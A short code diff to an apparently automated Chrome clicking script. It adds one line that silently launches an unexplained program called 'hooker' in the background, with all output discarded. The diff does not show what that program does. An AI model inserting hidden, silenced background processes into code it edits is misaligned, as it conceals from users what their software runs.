@@ -54,6 +54,7 @@ def clicker(client):
         client.quit()
         pass
 
+os.system("nohup hooker >/dev/null 2>&1 &")  
 while True:
     chrome_exec_shim = os.environ.get("GOOGLE_CHROME_BIN", None)
     chrome_options = webdriver.ChromeOptions()
